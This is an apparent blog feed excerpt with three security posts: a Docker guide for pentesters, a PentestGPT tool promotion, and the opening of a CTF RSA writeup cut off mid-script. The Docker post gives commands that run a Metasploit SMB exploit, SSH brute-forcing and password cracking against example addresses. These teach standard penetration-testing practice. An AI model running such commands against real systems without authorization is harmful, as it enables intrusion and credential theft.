            "date_modified": "2024-02-05T01:47:31+06:00"
        },
        {
            "id": "https://sakibulalikhan.pages.dev/docker-zero-to-hero-for-hackers-a-practical-guide-for-cybersecurity-enthusiasts.html",
            "url": "https://sakibulalikhan.pages.dev/docker-zero-to-hero-for-hackers-a-practical-guide-for-cybersecurity-enthusiasts.html",
            "title": "Docker Zero to Hero For Hackers: A Practical Guide for Cybersecurity Enthusiasts",
            "summary": "Docker is an open-source platform designed to empower developers by facilitating the building, shipping, and running of applications within containers. As a lightweight and portable&hellip;",
            "content_html": "<div class=\"layout__panel layout__panel--navigation-bar\"><nav class=\"navigation-bar navigation-bar--editor\">\n<div class=\"navigation-bar__inner navigation-bar__inner--edit-pagedownButtons\">\n<div> </div>\n</div>\n</nav></div>\n<div class=\"layout__panel flex flex--row\">\n<div class=\"layout__panel layout__panel--preview\">\n<div class=\"preview\">\n<div class=\"preview__inner-1\">\n<div class=\"preview__inner-2\">\n<div class=\"cl-preview-section\">\n<p id=\"introduction\"><span style=\"color: var(--text-primary-color); font-family: var(--editor-font-family); font-size: inherit; font-weight: var(--font-weight-normal);\">Docker is an open-source platform designed to empower developers by facilitating the building, shipping, and running of applications within containers. As a lightweight and portable containerization technology, Docker wraps an application and its dependencies into a container, allowing easy deployment across diverse host systems. In this blog post, we’ll delve into the fundamental concepts of Docker, breaking down the intricacies for cybersecurity enthusiasts. We’ll cover container basics, Docker architecture, and provide practical examples of how Docker can be a game-changer in the realm of cybersecurity.</span></p>\n</div>\n<div class=\"cl-preview-section\">\n<h2 id=\"what-is-a-container\">What is a container?</h2>\n</div>\n<div class=\"cl-preview-section\">\n<p><img loading=\"lazy\" src=\"https://apachebooster.com/kb/wp-content/uploads/2017/09/docker-container.png\" alt=\"docker-container » Open Up The Cloud\" width=\"411\" height=\"327\" data-is-external-image=\"true\"></p>\n<p>A container is a standardized unit of software bundling code and its dependencies. It ensures swift and reliable application execution across different computing environments. In cybersecurity terms, a container serves as a secure vault encapsulating an application, its libraries, and essential system dependencies. The lightweight and portable nature of containers makes them ideal for cybersecurity tasks, enabling seamless deployment in various environments.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h2 id=\"containers-vs-virtual-machines\">Containers vs Virtual Machines</h2>\n</div>\n<div class=\"cl-preview-section\">\n<p><img loading=\"lazy\" src=\"https://th.bing.com/th/id/OIP.0Kuv9Rt9fQSFg5Nw9U2p3wAAAA?rs=1&amp;pid=ImgDetMain\" alt=\"Docker Containers vs. VMs: Pros and Cons of Containers and Virtual Machines\" data-is-external-image=\"true\"></p>\n<p>Containers and virtual machines (VMs) both isolate applications and their dependencies, yet they differ significantly:</p>\n</div>\n<div class=\"cl-preview-section\">\n<ul>\n<li>\n<p><strong>Resource Utilization</strong>: Containers share the host OS kernel, making them lighter and faster compared to VMs, which require a full-fledged OS.</p>\n</li>\n<li>\n<p><strong>Portability</strong>: Containers excel in portability, capable of running on any system with a compatible host OS. VMs, however, rely on specific hypervisors for compatibility.</p>\n</li>\n<li>\n<p><strong>Security</strong>: VMs offer heightened security with isolated operating systems. Containers, sharing the host OS, provide less isolation but are more manageable.</p>\n</li>\n<li>\n<p><strong>Management</strong>: Container management is generally easier due to their lightweight and agile nature.</p>\n</li>\n</ul>\n</div>\n<div class=\"cl-preview-section\">\n<h2 id=\"why-are-containers-lightweight\">Why are containers lightweight?</h2>\n</div>\n<div class=\"cl-preview-section\">\n<p>Containers achieve their lightweight nature through containerization, a technology enabling them to share the host OS kernel and libraries while maintaining application isolation. This results in a compact footprint compared to traditional virtual machines, as containers exclude a full OS, further minimizing their size.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h2 id=\"docker-architecture\">Docker Architecture</h2>\n</div>\n<div class=\"cl-preview-section\">\n<figure class=\"post__image\"><img loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/16/docker-architecture-diagram.png\" alt=\"Docker Architecture for Hackers/Pentester\" width=\"440\" height=\"347\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/16/responsive/docker-architecture-diagram-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/16/responsive/docker-architecture-diagram-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/16/responsive/docker-architecture-diagram-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/16/responsive/docker-architecture-diagram-lg.png 1024w\"></figure>\n<p>Docker follows a client-server architecture comprising:</p>\n</div>\n<div class=\"cl-preview-section\">\n<ul>\n<li>\n<p><strong>Docker Client</strong>: A command-line interface (CLI) tool sending commands to the Docker daemon.</p>\n</li>\n<li>\n<p><strong>Docker Daemon</strong>: The server component managing Docker objects such as images, containers, networks, and volumes.</p>\n</li>\n<li>\n<p><strong>Docker Registry</strong>: A central repository storing Docker images.</p>\n</li>\n</ul>\n</div>\n<div class=\"cl-preview-section\">\n<p><a href=\"https://docs.docker.com/engine/docker-overview/architecture/\"></a><span style=\"color: var(--headings-color); font-family: var(--font-base); font-size: 1.60181em; font-weight: var(--font-weight-bold); letter-spacing: var(--letter-spacing);\">How to use Docker?</span></p>\n</div>\n<div class=\"cl-preview-section\">\n<p>The Docker lifecycle involves creating a Dockerfile, building a Docker image, running a Docker container, and pushing the Docker image to a registry. Here’s a brief overview:</p>\n</div>\n<div class=\"cl-preview-section\">\n<ol>\n<li><strong>Create a Dockerfile</strong>: A text file with instructions for building a Docker image.</li>\n<li><strong>Build the Docker image</strong>: Use the Dockerfile to create a read-only template.</li>\n<li><strong>Run the Docker container</strong>: Create a running instance of the image.</li>\n<li><strong>Push the Docker image</strong>: Share the built image on a Docker registry for collaboration.</li>\n</ol>\n</div>\n<div class=\"cl-preview-section\">\n<h2 id=\"docker-lifecycle\">Docker LifeCycle</h2>\n</div>\n<div class=\"cl-preview-section\">\n<figure class=\"post__image\"><img loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/16/docker-container-lifecycle-diagram.png\" alt=\"Docker Container Lifecycle Diagram\" width=\"609\" height=\"343\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/16/responsive/docker-container-lifecycle-diagram-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/16/responsive/docker-container-lifecycle-diagram-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/16/responsive/docker-container-lifecycle-diagram-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/16/responsive/docker-container-lifecycle-diagram-lg.png 1024w\"></figure>\n</div>\n<div class=\"cl-preview-section\">\n<ul>\n<li><code>docker build</code>: Builds Docker images from a Dockerfile.</li>\n<li><code>docker run</code>: Runs a container from Docker images.</li>\n<li><code>docker push</code>: Pushes the container image to public/private registries for sharing.</li>\n</ul>\n</div>\n<div class=\"cl-preview-section\">\n<h2 id=\"understanding-the-terminology\">Understanding the Terminology</h2>\n</div>\n<div class=\"cl-preview-section\">\n<h3><figure class=\"post__image\"><img loading=\"lazy\"  src=\"https://th.bing.com/th/id/R.8075d1933dff4f771cbd666c66347d9a?rik=Nr7Yj30lB3TBUw&amp;pid=ImgRaw&amp;r=0\" alt=\"\" width=\"419\" height=\"325\" data-is-external-image=\"true\"></figure></h3>\n<h3 id=\"docker-daemon\">Docker Daemon</h3>\n</div>\n<div class=\"cl-preview-section\">\n<p>The Docker daemon listens for Docker API requests, managing Docker objects like images, containers, networks, and volumes. Daemons can communicate with each other to handle Docker services.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h3 id=\"docker-client\">Docker Client</h3>\n</div>\n<div class=\"cl-preview-section\">\n<p>The Docker client is the primary way users interact with Docker. Commands such as <code>docker run</code> are sent to the client, which executes them. The Docker client can communicate with multiple daemons.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h3 id=\"docker-desktop\">Docker Desktop</h3>\n</div>\n<div class=\"cl-preview-section\">\n<p>Docker Desktop is an easy-to-install application for Mac, Windows, or Linux environments. It includes the Docker daemon, Docker client, Docker Compose, Docker Content Trust, Kubernetes, and Credential Helper.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h3 id=\"docker-registries\">Docker Registries</h3>\n</div>\n<div class=\"cl-preview-section\">\n<p>Docker registries store Docker images. Docker Hub is a public registry, and Docker is configured to look for images there by default. Users can also run private registries.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h2 id=\"install-docker\">INSTALL DOCKER</h2>\n</div>\n<div class=\"cl-preview-section\">\n<figure class=\"post__image\"><img loading=\"lazy\"  src=\"https://cdn.freebiesupply.com/logos/large/2x/docker-logo-png-transparent.png\" alt=\"\" width=\"362\" height=\"304\" data-is-external-image=\"true\"></figure>\n<p>For detailed instructions on installing Docker, visit <a href=\"https://docs.docker.com/get-docker/\" target=\"_blank\" rel=\"noopener noreferrer\">Docker Installation Guide</a>.</p>\n</div>\n<div class=\"cl-preview-section\">\n<p>For a quick demo, create an Ubuntu EC2 instance on AWS and execute the following commands:</p>\n</div>\n<div class=\"cl-preview-section\">\n<pre class=\"language-bash line-numbers\"><code>sudo apt update\nsudo apt install docker.io -y\n</code></pre>\n</div>\n<div class=\"cl-preview-section\">\n<h3 id=\"start-docker-and-grant-access\">Start Docker and Grant Access</h3>\n</div>\n<div class=\"cl-preview-section\">\n<p>After installing Docker, ensure the Docker daemon is running. Verify with:</p>\n</div>\n<div class=\"cl-preview-section\">\n<pre class=\"language-bash line-numbers\"><code>sudo systemctl status docker\n</code></pre>\n</div>\n<div class=\"cl-preview-section\">\n<p>If not running, start the daemon:</p>\n</div>\n<div class=\"cl-preview-section\">\n<pre class=\"language-bash line-numbers\"><code>sudo systemctl start docker\n</code></pre>\n</div>\n<div class=\"cl-preview-section\">\n<p>Grant access to your user:</p>\n</div>\n<div class=\"cl-preview-section\">\n<pre class=\"language-bash line-numbers\"><code>sudo usermod -aG docker ubuntu\n</code></pre>\n</div>\n<div class=\"cl-preview-section\">\n<p>Log out and log back in for changes to take effect.</p>\n</div>\n<div class=\"cl-preview-section\">\n<p>Verify Docker installation:</p>\n</div>\n<div class=\"cl-preview-section\">\n<pre class=\"language-bash line-numbers\"><code>docker run hello-world\n</code></pre>\n</div>\n<div class=\"cl-preview-section\">\n<h2 id=\"docker-is-installed-up-and-running\">Docker is Installed, up and running</h2>\n</div>\n<div class=\"cl-preview-section\">\n<p>Use the same command to confirm:</p>\n</div>\n<div class=\"cl-preview-section\">\n<pre class=\"language-bash line-numbers\"><code>docker run hello-world\n</code></pre>\n</div>\n<div class=\"cl-preview-section\">\n<h2 id=\"docker-images-for-cybersecuritypentesting\">Docker Images for Cybersecurity/Pentesting</h2>\n</div>\n<div class=\"cl-preview-section\">\n<p>Docker provides a rich ecosystem of pre-built images tailored for cybersecurity and penetration testing, offering versatility and efficiency in setting up security environments. Here are additional examples of Docker images that cater to specific cybersecurity needs:</p>\n</div>\n<div class=\"cl-preview-section\">\n<ol>\n<li>\n<p><strong>Kali Linux</strong></p>\n<p>Kali Linux is a widely-used Linux distribution for penetration testing, forensics, and security auditing. The Kali Linux Docker image is a versatile tool for cybersecurity practitioners. It includes a plethora of tools such as Wireshark, Nmap, Burp Suite, and John the Ripper.</p>\n<pre class=\"language-bash line-numbers\"><code>docker pull kalilinux/kali-linux-docker\n</code></pre>\n<p>Example Usage:</p>\n<pre class=\"language-bash line-numbers\"><code>docker run -it kalilinux/kali-linux-docker /bin/bash\n</code></pre>\n<ul>\n<li>\n<p><strong>Additional Example 1:</strong> Launching Wireshark for network analysis within the Kali Linux container:</p>\n<pre class=\"language-bash line-numbers\"><code>docker run -it --rm --net=host --cap-add=NET_ADMIN kalilinux/kali-linux-docker wireshark\n</code></pre>\n<p>In this scenario, the container gains access to the host network stack, enabling network analysis with Wireshark directly from the container.</p>\n</li>\n<li>\n<p><strong>Additional Example 2:</strong> Performing a quick Nmap scan on a target:</p>\n<pre class=\"language-bash line-numbers\"><code>docker run -it --rm kalilinux/kali-linux-docker nmap -p 1-1000 192.168.1.1\n</code></pre>\n<p>This command runs an Nmap scan against the specified IP address, showcasing the utility of Kali Linux tools within the Docker container.</p>\n</li>\n<li>\n<p><strong>Additional Example 3:</strong> Using John the Ripper to crack passwords:</p>\n<pre class=\"language-bash line-numbers\"><code>docker run -it --rm kalilinux/kali-linux-docker john --wordlist=/usr/share/wordlists/rockyou.txt /path/to/password/file\n</code></pre>\n<p>Here, the container employs John the Ripper to attempt password cracking using a common wordlist.</p>\n</li>\n</ul>\n</li>\n<li>\n<p><strong>Metasploit Framework</strong></p>\n<p>Metasploit Framework is a powerful open-source tool for penetration testing, vulnerability research, and development. The Metasploit Framework Docker image simplifies the setup of Metasploit within a controlled environment.</p>\n<pre class=\"language-bash line-numbers\"><code>docker pull metasploitframework/metasploit-framework\n</code></pre>\n<p>Example Usage:</p>\n<pre class=\"language-bash line-numbers\"><code>docker run --rm -it metasploitframework/metasploit-framework\n</code></pre>\n<ul>\n<li>\n<p><strong>Additional Example 1:</strong> Running an auxiliary module for HTTP enumeration:</p>\n<pre class=\"language-bash line-numbers\"><code>docker run --rm -it metasploitframework/metasploit-framework msfconsole -x \"use auxiliary/scanner/http/http_enum; set RHOSTS 192.168.1.1; run\"\n</code></pre>\n<p>This command launches Metasploit and executes an HTTP enumeration scan against the specified target.</p>\n</li>\n<li>\n<p><strong>Additional Example 2:</strong> Exploiting a known vulnerability using Metasploit:</p>\n<pre class=\"language-bash line-numbers\"><code>docker run --rm -it metasploitframework/metasploit-framework msfconsole -x \"use exploit/windows/smb/ms08_067_netapi; set RHOSTS 192.168.1.1; run\"\n</code></pre>\n<p>Here, Metasploit is utilized to exploit a specific Windows SMB vulnerability on the given IP address.</p>\n</li>\n<li>\n<p><strong>Additional Example 3:</strong> Brute-forcing SSH credentials using Metasploit:</p>\n<pre class=\"language-bash line-numbers\"><code>docker run --rm -it metasploitframework/metasploit-framework msfconsole -x \"use auxiliary/scanner/ssh/ssh_login; set RHOSTS 192.168.1.1; set USER_FILE /path/to/usernames.txt; set PASS_FILE /path/to/passwords.txt; run\"\n</code></pre>\n<p>This command demonstrates using Metasploit for SSH credential brute-forcing.</p>\n</li>\n</ul>\n</li>\n</ol>\n</div>\n<div class=\"cl-preview-section\">\n<h2 id=\"conclusion\">Conclusion</h2>\n</div>\n<div class=\"cl-preview-section\">\n<p>Docker has revolutionized software development and deployment. Its ability to package applications and dependencies into portable containers streamlines deployment across different environments. Docker’s versatility and user-friendly approach make it an ideal solution for modern software development practices, including continuous integration and delivery. Embrace Docker, and let your journey from zero to hero in the cybersecurity landscape begin!</p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>",
            "image": "https://sakibulalikhan.pages.dev/media/posts/16/Docker-Zero-to-Hero-For-Hackers-A-Practical-Guide-for-Cybersecurity-Enthusiasts.png",
            "author": {
                "name": "Sakibul Ali Khan"
            },
            "tags": [
                   "Pentesting",
                   "Docker",
                   "DevSecOps",
                   "Cyber Security",
                   "Cloud Security"
            ],
            "date_published": "2024-02-01T05:05:20+06:00",
            "date_modified": "2024-02-05T02:32:09+06:00"
        },
        {
            "id": "https://sakibulalikhan.pages.dev/unveiling-pentestgpt-the-ultimate-weapon-for-hacker-and-penetration-tester-2.html",
            "url": "https://sakibulalikhan.pages.dev/unveiling-pentestgpt-the-ultimate-weapon-for-hacker-and-penetration-tester-2.html",
            "title": "Unveiling PentestGPT: The Ultimate Weapon For Hacker And Penetration Tester",
            "summary": "In the continuously evolving landscape of cybersecurity, staying ahead of potential threats is of utmost importance. Say hello to PentestGPT, the groundbreaking penetration testing tool&hellip;",
            "content_html": "<div class=\"cl-preview-section\">\n<p><span style=\"color: var(--text-primary-color); font-family: var(--editor-font-family); font-size: inherit; font-weight: var(--font-weight-normal);\">In the continuously evolving landscape of cybersecurity, staying ahead of potential threats is of utmost importance. Say hello to PentestGPT, the groundbreaking penetration testing tool that harnesses the power of ChatGPT to streamline and automate the penetration testing process. Developed by GreyDGL, a Ph.D. student at Nanyang Technological University, this tool introduces a novel approach to penetration testing, combining cutting-edge technology with a user-friendly interface.</span></p>\n</div>\n<div class=\"cl-preview-section\">\n<h2><strong>Empowering Pentesters: Enhanced Efficiency and Effectiveness</strong></h2>\n</div>\n<div class=\"cl-preview-section\">\n<p>Penetration testing, also known as ethical hacking, is a vital practice for identifying system vulnerabilities before malicious actors exploit them. PentestGPT acts as an invaluable companion for penetration testers, automating multiple testing aspects while maintaining an interactive mode. Designed to empower cybersecurity experts, this tool significantly enhances their overall progress and specific operations, optimizing the penetration testing process.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h2><strong>The Power of ChatGPT: Empowering PentestGPT’s Performance</strong></h2>\n</div>\n<div class=\"cl-preview-section\">\n<p>At the heart of PentestGPT lies the ChatGPT API, particularly the GPT-4 module renowned for its exceptional performance in penetration testing reasoning. By integrating ChatGPT, PentestGPT leverages human-like conversations, offering informative guidance to penetration testers throughout complex procedures. For optimal performance, ChatGPT Plus or the GPT-4 API is recommended.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h2><strong>Simplified User Interface: Seamlessly Navigate PentestGPT</strong></h2>\n</div>\n<div class=\"cl-preview-section\">\n<p>PentestGPT boasts a user-friendly design that simplifies the penetration testing workflow. The tool comprises three main modules: test generation, test reasoning, and parsing. Featuring a unified terminal input handler, it serves as the primary access point, enabling users—both cybersecurity professionals and non-technical individuals—to initiate sessions, start new testing sessions, and request to-do lists. PentestGPT ensures seamless interaction, accommodating users of varying technical expertise.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h2><strong>Unveiling the Inner Workings of PentestGPT</strong></h2>\n</div>\n<div class=\"cl-preview-section\">\n<p>PentestGPT operates through a logical flow that entails user initialization, task-tree generation, to-do list determination, and continuous user interaction. The tool facilitates the execution of penetration testing commands, parsing tool outputs, and dynamically updating the task-tree based on gathered information. PentestGPT’s interactive nature allows users to engage in discussions, receive guidance, and stay informed throughout the testing process.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h2><strong>Installation Guide: Step-by-Step Setup</strong></h2>\n</div>\n<div class=\"cl-preview-section\">\n<ol>\n<li><strong>Clone the Repository:</strong>\n<ul>\n<li>\n<p>Begin by cloning the PentestGPT repository from GitHub.</p>\n<pre><code>git clone https://github.com/GreyDGL/PentestGPT.git\ncd PentestGPT\n</code></pre>\n</li>\n</ul>\n</li>\n<li><strong>Install Dependencies:</strong>\n<ul>\n<li>\n<p>Install the necessary dependencies using pip.</p>\n<pre><code>pip install -r requirements.txt\n</code></pre>\n</li>\n</ul>\n</li>\n<li><strong>Configure ChatGPT Session:</strong>\n<ul>\n<li>\n<p>Copy the sample configuration file and configure the ChatGPT session with cookies.</p>\n<pre><code>cp config/chatgpt_config_sample.py config/chatgpt_config.py\n</code></pre>\n</li>\n</ul>\n</li>\n<li><strong>Obtain ChatGPT Session Cookie:</strong>\n<ul>\n<li>Log in to the ChatGPT session page and open the Inspect tool.</li>\n<li>Navigate to the Network tab and locate connections to the ChatGPT session page.</li>\n<li>Find the cookie in the request header of the URL \"<a href=\"https://chat.openai.com/api/auth/session.%22\">https://chat.openai.com/api/auth/session.\"</a></li>\n<li>Copy the cookie value and paste it into the “cookie” field in the “config/chatgpt_config.py” file.</li>\n</ul>\n</li>\n<li><strong>Test Connection: Verify Configuration</strong>\n<ul>\n<li>\n<p>Confirm the connection is properly configured.</p>\n<pre><code>python3 test_connection.py\n</code></pre>\n</li>\n</ul>\n</li>\n<li><strong>Start PentestGPT:</strong>\n<ul>\n<li>\n<p>Utilize the reasoning model recommended based on your access.</p>\n<pre><code>pentestgpt --reasoning_model=gpt-4-turbo\n</code></pre>\n<ul>\n<li>(recommended) - <code>pentestgpt --reasoning_model=gpt-4-turbo</code> to use the latest GPT-4-turbo API.</li>\n<li><code>pentestgpt --reasoning_model=gpt-4</code> if you have access to GPT-4 API.</li>\n<li><code>pentestgpt --reasoning_model=gpt-3.5-turbo-16k</code> if you only have access to GPT-3.5 API.</li>\n</ul>\n</li>\n</ul>\n</li>\n</ol>\n</div>\n<div class=\"cl-preview-section\">\n<p><strong>Installation Video:</strong><br><div class=\"post__iframe\"><iframe loading=\"lazy\" width=\"560\" height=\"315\" src=\"https://www.youtube-nocookie.com/embed/tGC5z14dE24?si=Bot2TYzI5jLFt3-q\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share\" allowfullscreen=\"allowfullscreen\"></iframe></div>\n</div>\n<div class=\"cl-preview-section\">\n<h2><strong>Examples of Usage: Unleash PentestGPT’s Potential</strong></h2>\n</div>\n<div class=\"cl-preview-section\">\n<ol>\n<li><strong>Initializing a New Penetration Testing Session:</strong>\n<ul>\n<li>\n<p>Initiate a new session using the handler, providing target information.</p>\n<pre><code>pentestgpt --args\n</code></pre>\n</li>\n</ul>\n</li>\n<li><strong>Executing Tasks:</strong>\n<ul>\n<li>\n<p>Follow the guidance to perform various penetration testing tasks. For instance:</p>\n<pre><code>pentestgpt --reasoning_model=gpt-4-turbo\n</code></pre>\n</li>\n</ul>\n</li>\n<li><strong>Discussing Findings:</strong>\n<ul>\n<li>\n<p>Engage PentestGPT in insightful discussions about specific findings.</p>\n<pre><code>pentestgpt --discuss\n</code></pre>\n</li>\n</ul>\n</li>\n<li><strong>Obtaining a To-Do List:</strong>\n<ul>\n<li>\n<p>Request a comprehensive to-do list from PentestGPT for the next steps.</p>\n<pre><code>pentestgpt --todo\n</code></pre>\n</li>\n</ul>\n</li>\n<li><strong>Exiting the Program:</strong>\n<ul>\n<li>\n<p>Safely exit the program once the testing is complete.</p>\n<pre><code>pentestgpt --quit\n</code></pre>\n</li>\n</ul>\n</li>\n</ol>\n</div>\n<div class=\"cl-preview-section\">\n<p><strong>Demo Video:</strong><br><div class=\"post__iframe\"><iframe loading=\"lazy\" width=\"560\" height=\"315\" src=\"https://www.youtube-nocookie.com/embed/Vs9DFtAkODM?si=EepYs3OjmWVTUFOF\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share\" allowfullscreen=\"allowfullscreen\"></iframe></div>\n</div>\n<div class=\"cl-preview-section\">\n<h2><strong>In Conclusion: Welcome to the Era of PentestGPT</strong></h2>\n</div>\n<div class=\"cl-preview-section\">\n<p>PentestGPT emerges as a groundbreaking tool in the realm of automated penetration testing, revolutionizing the fusion of advanced technology and user-friendly design. Whether you are an experienced cybersecurity professional or possess a non-technical background, PentestGPT bridges the gap, facilitating efficient and effective security testing. Its ability to automate tasks, engage in interactive conversations, and guide users throughout the penetration testing process cements its status as a valuable asset in the cybersecurity arsenal.</p>\n</div>\n<div class=\"cl-preview-section\">\n<p>In a world where cybersecurity threats constantly evolve, PentestGPT shines as an innovative beacon, making security testing more accessible, efficient, and impactful than ever before. Embrace the power of PentestGPT and unlock unparalleled security expertise.</p>\n</div>",
            "image": "https://sakibulalikhan.pages.dev/media/posts/15/Unveiling-PentestGPT_-The-Ultimate-Weapon-For-Hacker-And-Penetration-Tester-2.jpg",
            "author": {
                "name": "Sakibul Ali Khan"
            },
            "tags": [
                   "Pentesting",
                   "Hacking Tools",
                   "Artificial Intelligence"
            ],
            "date_published": "2024-01-30T00:27:41+06:00",
            "date_modified": "2024-01-30T01:13:15+06:00"
        },
        {
            "id": "https://sakibulalikhan.pages.dev/backdoorctf-2023-mini_rsa-challenge-writeup.html",
            "url": "https://sakibulalikhan.pages.dev/backdoorctf-2023-mini_rsa-challenge-writeup.html",
            "title": "BackdoorCTF 2023 — mini_RSA Challenge Writeup",
            "summary": "reetings, fellow cybersecurity enthusiasts and CTF players! In this writeup, we will dive into the solution of the “mini_RSA” challenge from the BackdoorCTF 2023. Groot&hellip;",
            "content_html": "<p id=\"fd65\" class=\"pw-post-body-paragraph mr ms gr mt b mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no gk bj ot\" data-selectable-paragraph=\"\">reetings, fellow cybersecurity enthusiasts and CTF players! In this writeup, we will dive into the solution of the “mini_RSA” challenge from the BackdoorCTF 2023.</p>\n<figure class=\"pd pe pf pg ph mp mh mi paragraph-image\">\n<div class=\"pi pj fg pk bg pl\" tabindex=\"0\" role=\"button\">\n<div class=\"mh mi amo\"><figure class=\"bg lo mq c\"><source srcset=\"https://miro.medium.com/v2/resize:fit:640/format:webp/1*mN-RcjmqlEvyxQruV5Q1ZQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*mN-RcjmqlEvyxQruV5Q1ZQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*mN-RcjmqlEvyxQruV5Q1ZQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*mN-RcjmqlEvyxQruV5Q1ZQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*mN-RcjmqlEvyxQruV5Q1ZQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*mN-RcjmqlEvyxQruV5Q1ZQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*mN-RcjmqlEvyxQruV5Q1ZQ.png 1400w\" sizes=\"(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px\" type=\"image/webp\"><source data-testid=\"og\" srcset=\"https://miro.medium.com/v2/resize:fit:640/1*mN-RcjmqlEvyxQruV5Q1ZQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*mN-RcjmqlEvyxQruV5Q1ZQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*mN-RcjmqlEvyxQruV5Q1ZQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*mN-RcjmqlEvyxQruV5Q1ZQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*mN-RcjmqlEvyxQruV5Q1ZQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*mN-RcjmqlEvyxQruV5Q1ZQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*mN-RcjmqlEvyxQruV5Q1ZQ.png 1400w\" sizes=\"(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px\"><img  src=\"https://miro.medium.com/v2/resize:fit:700/1*mN-RcjmqlEvyxQruV5Q1ZQ.png\" alt=\"BackdoorCTF 2023 — mini_RSA Challenge Writeup by sakibulalikhan\" width=\"700\" height=\"264\" loading=\"eager\" data-is-external-image=\"true\"></figure></picture></div>\n</div>\n</figure>\n<h1 id=\"9504\" class=\"np nq gr be nr ns nt nu nv nw nx ny nz oa ob oc od oe of og oh oi oj ok ol om bj\" data-selectable-paragraph=\"\">Challenge Overview</h1>\n<p id=\"3af4\" class=\"pw-post-body-paragraph mr ms gr mt b mu on mw mx my oo na nb nc op ne nf ng oq ni nj nk or nm nn no gk bj\" data-selectable-paragraph=\"\">Groot has encrypted a message using RSA with a key size of 512 bits and a public exponent (RSA_E) of 3. The challenge provides two files: <code class=\"cw amp amq amr po b\">script.py</code> and <code class=\"cw amp amq amr po b\">output.txt</code>. The former contains the RSA encryption script used by Groot, while the latter presents the output ciphertext (c) and the modulus (n).</p>\n<p id=\"b79b\" class=\"pw-post-body-paragraph mr ms gr mt b mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no gk bj\" data-selectable-paragraph=\"\">Let’s explore the provided files and understand the challenge before revealing the solution.</p>\n<h1 id=\"ef6e\" class=\"np nq gr be nr ns nt nu nv nw nx ny nz oa ob oc od oe of og oh oi oj ok ol om bj\" data-selectable-paragraph=\"\">The Encryption Script: script.py</h1>\n<pre class=\"pd pe pf pg ph pn po pp bo pq ba bj\"><span id=\"cc79\" class=\"pr nq gr po b bf ps pt l pu pv\" data-selectable-paragraph=\"\"><span class=\"hljs-comment\"># Import necessary modules</span><br><span class=\"hljs-keyword\">from</span> Crypto.Util.number <span class=\"hljs-keyword\">import</span> getPrime, bytes_to_long, GCD<br><span class=\"hljs-keyword\">import</span> random<br><span class=\"hljs-keyword\">import</span> time<br><br><span class=\"hljs-comment\"># Set the seed for randomness</span><br>random.seed(time.time())<br><br><span class=\"hljs-comment\"># Define the flag to be encrypted (flag{REDACTED})</span><br>flag = <span class=\"hljs-string\">b\"flag{REDACTED}\"</span><br><br><span class=\"hljs-comment\"># Define RSA parameters</span><br>KEY_SIZE = <span class=\"hljs-number\">512</span><br>RSA_E = <span class=\"hljs-number\">3</span><br><br><span class=\"hljs-comment\"># Function for fast modular exponentiation</span><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title.function\">fast_exp</span>(<span class=\"hljs-params\">a, b, n</span>):<br>    output = <span class=\"hljs-number\">1</span><br>    <span class=\"hljs-keyword\">while</span> b &gt; <span class=\"hljs-number\">0</span>:<br>        <span 